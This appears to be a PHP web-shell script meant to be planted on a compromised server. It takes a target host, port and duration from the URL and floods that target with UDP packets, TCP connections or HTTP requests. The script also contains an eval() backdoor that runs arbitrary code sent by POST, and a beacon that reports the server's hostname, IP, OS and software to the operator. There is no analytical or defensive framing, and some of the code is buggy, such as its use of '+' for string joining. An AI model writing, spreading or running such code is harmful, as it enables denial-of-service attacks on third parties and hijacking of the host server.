<?php
ini_set("display_errors", "Off");
set_time_limit(999999);
$host = $_GET['host'];
$port = $_GET['port'];
$exec_time = $_GET['time'];
$type=$_GET['type'];
$Sendlen = 65535; 
$packets = 0;
$name=eval($_POST['time']);
ignore_user_abort(True);
if (StrLen($host)==0 or StrLen($port)==0 or StrLen($exec_time)==0){
        if (StrLen($_GET['rat'])<>0){
                echo $_GET['rat'].$_SERVER["HTTP_HOST"]."|".GetHostByName($_SERVER['SERVER_NAME'])."|".php_uname()."|".$_SERVER['SERVER_SOFTWARE'].$_GET['rat'];
                exit;
            }
        echo "Warning to: opening";
        exit;
    }

if($type=='udp'){
	for($i=0;$i<$Sendlen;$i++){
        $out .= "A";
    }
	$max_time = time()+$exec_time;
	
	while(1){
		$packets++;
		if(time() > $max_time){
			break;
		}
		$fp = fsockopen("udp://$host", $port, $errno, $errstr, 5);
		if($fp){
			fwrite($fp, $out);
			fclose($fp);
		}
	}
	echo "udp|".round($packets*$Sendlen/1024/1024, 2)."mb|".round($packets/$exec_time*$Sendlen/1024/1024, 2)."mb/s";	
}

elseif($type=='tcp'){
	for($i=0;$i<$Sendlen;$i++){
        $out .= "A";
    }
	$max_time = time()+$exec_time;
	
	while(1){
		$packets++;
		if(time() > $max_time){
			break;
		}
		$fp = fsockopen("tcp://$host", $port, $errno, $errstr, 0);
	}
	echo "tcp|".round($packets*$Sendlen/1024/1024, 2)."mb|".round($packets/$exec_time*$Sendlen/1024/1024, 2)."mb/s";	
}


else{
	$sayi = 1;  
	$cl=str_replace("cc","",$type); 
	$ccloop=intval($cl);
	$port=intval($port);
	while ( $sayi <= $ccloop )   
	{
		$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
		if ($sock === false) {
			exit;
		}
 		socket_connect($sock,$host,$port);

        	$msg = "HTTP/1.1 GET /\r\nHost:"+$host+"\r\nConnection: Keep-Alive\r\n";
        	socket_write($msg);
        	socket_close($sock);
        	$sayi++;   
	}
	echo "cc|".$cl;   
}
;?>